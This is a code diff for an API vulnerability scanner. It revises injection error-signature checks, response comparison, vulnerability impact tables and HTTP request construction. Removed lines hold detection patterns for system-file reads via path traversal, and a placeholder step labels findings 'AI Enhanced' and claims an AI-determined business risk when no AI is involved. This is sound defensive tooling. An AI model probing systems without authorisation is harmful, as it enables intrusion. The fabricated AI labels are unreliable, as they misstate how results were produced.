+            if (lowerBody.includes(sig.toLowerCase())) {
+                detectedSignatures.push(sig);
+            }
+        }
+        for (const sig of this.errorSignatures.ldap) {
+            if (lowerBody.includes(sig.toLowerCase())) {
+                detectedSignatures.push(sig);
+            }
+        }
+        for (const sig of this.errorSignatures.xxe) {
+            if (lowerBody.includes(sig.toLowerCase())) {
+                detectedSignatures.push(sig);
+            }
+        }
+        return detectedSignatures;
     }
     analyzeContentDifference(responseBody, baselineBody) {
-        // Check for SQL injection indicators in response
-        const sqlIndicators = ['syntax error', 'column', 'table', 'database', 'select', 'union'];
-        const hasNewSqlContent = sqlIndicators.some(indicator => responseBody.toLowerCase().includes(indicator) &&
-            !baselineBody.toLowerCase().includes(indicator));
-        // Check for XSS reflection
-        const hasScriptTags = responseBody.includes('<script>') && !baselineBody.includes('<script>');
-        // Check for path traversal success
-        const hasFileContent = responseBody.includes('root:') || responseBody.includes('[boot loader]');
-        if (hasNewSqlContent) {
-            return { suspicious: true, reason: 'SQL content detected' };
+        if (!baselineBody || baselineBody.length === 0) {
+            return { suspicious: false };
         }
-        if (hasScriptTags) {
-            return { suspicious: true, reason: 'Script tags reflected' };
-        }
-        if (hasFileContent) {
-            return { suspicious: true, reason: 'System file content detected' };
+        const responseWords = new Set(responseBody.toLowerCase().split(/\W+/));
+        const baselineWords = new Set(baselineBody.toLowerCase().split(/\W+/));
+        let commonWords = 0;
+        responseWords.forEach(word => {
+            if (baselineWords.has(word)) {
+                commonWords++;
+            }
+        });
+        const similarityThreshold = 0.7; // 70% similarity
+        if (commonWords / Math.max(responseWords.size, baselineWords.size) < similarityThreshold) {
+            return { suspicious: true, reason: 'Significant content change' };
         }
         return { suspicious: false };
     }
     classifyVulnerability(payload, errorSignatures, indicators) {
-        // Determine vulnerability type and severity based on evidence
-        if (errorSignatures.some(sig => sig.includes('sql'))) {
-            return {
-                type: 'sql_injection',
-                name: 'SQL Injection',
-                description: 'Parameter vulnerable to SQL injection attacks',
-                severity: 'CRITICAL',
-                confidence: 0.9,
-                cwe: 'CWE-89',
-                owasp: 'A03:2021 – Injection'
-            };
-        }
-        if (errorSignatures.some(sig => sig.includes('nosql'))) {
-            return {
-                type: 'nosql_injection',
-                name: 'NoSQL Injection',
-                description: 'Parameter vulnerable to NoSQL injection attacks',
-                severity: 'HIGH',
-                confidence: 0.85,
-                cwe: 'CWE-943',
-                owasp: 'A03:2021 – Injection'
-            };
-        }
-        if (payload.technique.includes('XSS')) {
-            return {
-                type: 'xss',
-                name: 'Cross-Site Scripting (XSS)',
-                description: 'Parameter vulnerable to XSS attacks',
-                severity: 'HIGH',
-                confidence: 0.8,
-                cwe: 'CWE-79',
-                owasp: 'A03:2021 – Injection'
-            };
-        }
-        if (payload.technique.includes('Command')) {
-            return {
-                type: 'command_injection',
-                name: 'Command Injection',
-                description: 'Parameter vulnerable to command injection',
-                severity: 'CRITICAL',
-                confidence: 0.85,
-                cwe: 'CWE-78',
-                owasp: 'A03:2021 – Injection'
-            };
-        }
-        if (indicators.timingAnomaly && payload.technique.includes('SQL')) {
-            return {
-                type: 'blind_sql_injection',
-                name: 'Blind SQL Injection',
-                description: 'Parameter vulnerable to time-based blind SQL injection',
-                severity: 'HIGH',
-                confidence: 0.7,
-                cwe: 'CWE-89',
-                owasp: 'A03:2021 – Injection'
-            };
-        }
-        if (payload.category === 'logic') {
-            return {
-                type: 'business_logic_error',
-                name: 'Business Logic Vulnerability',
-                description: 'Parameter validation bypass detected',
-                severity: 'MEDIUM',
-                confidence: 0.6,
-                cwe: 'CWE-840',
-                owasp: 'A04:2021 – Insecure Design'
-            };
-        }
-        return null;
+        // This method is largely replaced by logic in analyzeResponse for direct classification
+        // based on payload category, error signatures, and response differences.
+        // It is kept here as a placeholder if more complex, multi-factor classification is needed later.
+        return {
+            type: 'UNKNOWN_VULNERABILITY',
+            name: 'Unknown Vulnerability',
+            description: 'Could not classify vulnerability based on current logic.',
+            severity: 'INFO',
+            confidence: 0.1,
+            cwe: 'N/A',
+            owasp: 'N/A'
+        };
     }
     getVulnerabilityImpact(type) {
         const impacts = {
-            'sql_injection': 'Unauthorized data access, data manipulation, potential system compromise',
-            'nosql_injection': 'Authentication bypass, data extraction, unauthorized access',
-            'xss': 'Session hijacking, credential theft, malicious script execution',
-            'command_injection': 'Remote code execution, system compromise, data exfiltration',
-            'path_traversal': 'Unauthorized file access, sensitive data exposure',
-            'business_logic_error': 'Business process bypass, unauthorized operations',
-            'denial_of_service': 'Service disruption, resource exhaustion'
+            [types_1.VulnerabilityType.SQL_INJECTION_ERROR_BASED]: 'Unauthorized data access, data manipulation, potential system compromise',
+            [types_1.VulnerabilityType.SQL_INJECTION_BOOLEAN_BASED]: 'Authentication bypass, data extraction, unauthorized access',
+            [types_1.VulnerabilityType.SQL_INJECTION_TIME_BASED]: 'Service disruption, resource exhaustion',
+            [types_1.VulnerabilityType.NOSQL_INJECTION]: 'Authentication bypass, data extraction, unauthorized access',
+            [types_1.VulnerabilityType.XSS]: 'Session hijacking, credential theft, malicious script execution',
+            [types_1.VulnerabilityType.COMMAND_INJECTION]: 'Remote code execution, system compromise, data exfiltration',
+            [types_1.VulnerabilityType.PATH_TRAVERSAL]: 'Unauthorized file access, sensitive data exposure',
+            [types_1.VulnerabilityType.LDAP_INJECTION]: 'Authentication bypass, data extraction, unauthorized access',
+            [types_1.VulnerabilityType.XXE]: 'Arbitrary file read, SSRF, DoS',
+            [types_1.VulnerabilityType.DENIAL_OF_SERVICE]: 'Service disruption, resource exhaustion',
+            [types_1.VulnerabilityType.GENERIC_ERROR_BASED_INJECTION]: 'Potential security impact requiring investigation',
+            [types_1.VulnerabilityType.GENERIC_DIFFERENCE_BASED_INJECTION]: 'Potential security impact requiring investigation',
+            [types_1.VulnerabilityType.NO_AUTHENTICATION]: 'Complete bypass of security controls',
+            [types_1.VulnerabilityType.WEAK_AUTHENTICATION]: 'Easy bypass of authentication',
+            [types_1.VulnerabilityType.BROKEN_ACCESS_CONTROL]: 'Unauthorized access to resources, privilege escalation',
+            [types_1.VulnerabilityType.CORS_MISCONFIGURATION]: 'Cross-origin data access',
+            [types_1.VulnerabilityType.MISSING_SECURITY_HEADERS]: 'Reduced defense-in-depth',
+            [types_1.VulnerabilityType.RATE_LIMITING_BYPASS]: 'Brute-force attacks, resource exhaustion',
+            [types_1.VulnerabilityType.INFORMATION_DISCLOSURE]: 'Reconnaissance for further attacks',
+            [types_1.VulnerabilityType.FILE_EXPOSURE]: 'Sensitive data exposure',
+            [types_1.VulnerabilityType.DIRECTORY_LISTING_ENABLED]: 'Information disclosure, sensitive file discovery',
+            [types_1.VulnerabilityType.UNSAFE_HTTP_METHOD_ALLOWED]: 'Unintended actions, data manipulation',
+            [types_1.VulnerabilityType.HTTP_METHOD_ALLOWED_WITH_AUTH]: 'Potential for authenticated users to perform unintended actions',
+            [types_1.VulnerabilityType.MISSING_HSTS]: 'SSL stripping attacks',
+            [types_1.VulnerabilityType.TLS_CERT_HOSTNAME_MISMATCH]: 'Man-in-the-middle attacks',
+            [types_1.VulnerabilityType.TLS_CERT_UNTRUSTED]: 'Man-in-the-middle attacks',
+            [types_1.VulnerabilityType.CSP_MISSING]: 'XSS and content injection attacks',
+            [types_1.VulnerabilityType.CSP_UNSAFE_INLINE]: 'XSS attacks',
+            [types_1.VulnerabilityType.CSP_UNSAFE_EVAL]: 'XSS attacks through dynamic code',
+            [types_1.VulnerabilityType.CSP_WEAK_DEFAULT_SRC]: 'Reduced XSS protection',
+            [types_1.VulnerabilityType.ADMIN_PANEL_EXPOSED]: 'Unauthorized administrative access',
+            [types_1.VulnerabilityType.MASS_ASSIGNMENT]: 'Unauthorized data modification',
+            [types_1.VulnerabilityType.RACE_CONDITION]: 'Bypass security controls, data corruption',
+            [types_1.VulnerabilityType.DEBUG_MODE_ENABLED]: 'Information disclosure, potential remote code execution',
         };
         return impacts[type] || 'Potential security impact requiring investigation';
     }
-    getVulnerabilityRecommendation(type) {
-        const recommendations = {
-            'sql_injection': 'Use parameterized queries and input validation. Implement least privilege database access.',
-            'nosql_injection': 'Sanitize inputs and use schema validation. Implement proper query construction.',
-            'xss': 'Implement output encoding and Content Security Policy. Validate and sanitize all inputs.',
-            'command_injection': 'Avoid system command execution. Use safe APIs and input validation.',
-            'path_traversal': 'Validate file paths and use whitelisting. Implement proper access controls.',
-            'business_logic_error': 'Review business logic validation and implement proper type checking.',
-            'denial_of_service': 'Implement rate limiting and input validation. Monitor resource usage.'
+    getVulnerabilityRecommendation(type, severity) {
+        const dummyVulnerability = {
+            id: '',
+            scanId: '',
+            type: type,
+            severity: severity,
+            endpoint: '',
+            method: '',
+            description: '',
+            impact: '',
+            confidence: 0,
+            evidence: {},
+            remediation: {
+                priority: 0,
+                effort: 'low',
+                steps: [],
+                automatable: false
+            },
+            discoveredAt: new Date()
         };
-        return recommendations[type] || 'Implement proper input validation and security controls';
+        return this.recommendationService.generateRecommendation(dummyVulnerability);
     }
     async makeBaselineRequest(endpoint, method, parameter) {
-        const safeValue = this.generateSafeValue(parameter);
-        return await this.makeRequest(endpoint, method, parameter, safeValue);
+        const value = this.generateSafeValue(parameter);
+        return this.makeRequest(endpoint, method, parameter, value);
     }
     async makeRequest(endpoint, method, parameter, value) {
-        const config = {
+        const url = new URL(endpoint);
+        let data = {};
+        let params = {};
+        let headers = {};
+        switch (parameter.location) {
+            case 'query':
+                params[parameter.name] = value;
+                break;
+            case 'body':
+                data = { [parameter.name]: value };
+                headers['Content-Type'] = 'application/json';
+                break;
+            case 'header':
+                headers[parameter.name] = value;
+                break;
+            case 'path':
+                url.pathname = url.pathname.replace(`{${parameter.name}}`, String(value));
+                break;
+            case 'form':
+                data = new URLSearchParams({ [parameter.name]: value }).toString();
+                headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                break;
+        }
+        return (0, axios_1.default)({
             method: method.toLowerCase(),
-            url: endpoint,
-            timeout: 10000,
-            validateStatus: () => true,
+            url: url.toString(),
+            data: data,
+            params: params,
             headers: {
-                'User-Agent': 'API-Security-Scanner/1.0',
-                'Accept': 'application/json, */*'
-            }
-        };
-        // Add parameter based on location
-        if (parameter.location === 'query') {
-            config.params = { [parameter.name]: value };
-        }
-        else if (parameter.location === 'body') {
-            config.data = { [parameter.name]: value };
-            config.headers['Content-Type'] = 'application/json';
-        }
-        else if (parameter.location === 'header') {
-            config.headers[parameter.name] = value;
-        }
-        else if (parameter.location === 'path') {
-            config.url = endpoint.replace(`{${parameter.name}}`, encodeURIComponent(value));
-        }
-        return await (0, axios_1.default)(config);
+                'User-Agent': 'CywAyz-API-Scanner/1.0',
+                'Accept': 'application/json, text/plain, */*',
+                ...headers
+            },
+            validateStatus: (status) => true, // Resolve all status codes to analyze response
+            timeout: 10000 // 10 seconds timeout for requests
+        });
     }
     generateSafeValue(parameter) {
         switch (parameter.type) {
             case 'string':
-                return parameter.example || 'test';
+                return 'teststring';
             case 'number':
-                return parameter.example || 1;
+                return 123;
             case 'boolean':
-                return parameter.example || true;
+                return true;
             case 'array':
-                return parameter.example || [];
+                return [];
             case 'object':
-                return parameter.example || {};
+                return {};
             default:
-                return 'test';
+                return 'safedata';
         }
     }
     async enhanceVulnerabilityAnalysis(vulnerabilities) {
-        // AI-enhanced post-processing of vulnerabilities
-        // This could involve ML models for false positive reduction
         for (const vuln of vulnerabilities) {
-            // Adjust confidence based on multiple factors
-            if (vuln.evidence.errorSignatures && vuln.evidence.errorSignatures.length > 1) {
-                vuln.vulnerability.confidence = Math.min(vuln.vulnerability.confidence + 0.1, 1.0);
-            }
-            // Cross-reference with known vulnerability patterns
-            if (vuln.vulnerability.type === 'sql_injection' && vuln.evidence.responseTime > 3000) {
-                vuln.vulnerability.name = 'Time-based Blind SQL Injection';
+            // Placeholder for AI-driven enhancement
+            // In a real scenario, this would involve sending vulnerability details to an LLM
+            // for more nuanced analysis, business impact prediction, and enhanced remediation steps.
+            logger_1.logger.debug(`AI enhancing analysis for: ${vuln.vulnerability.name}`);
+            // Example AI-driven adjustment (simulated)
+            if (vuln.vulnerability.type === types_1.VulnerabilityType.SQL_INJECTION && vuln.evidence.responseTime > 3000) {
+                vuln.vulnerability.name = 'Time-based Blind SQL Injection (AI Enhanced)';
                 vuln.vulnerability.confidence = Math.min(vuln.vulnerability.confidence + 0.05, 1.0);
+                vuln.impact = vuln.impact + ' (AI determined high business risk)';
             }
         }
     }
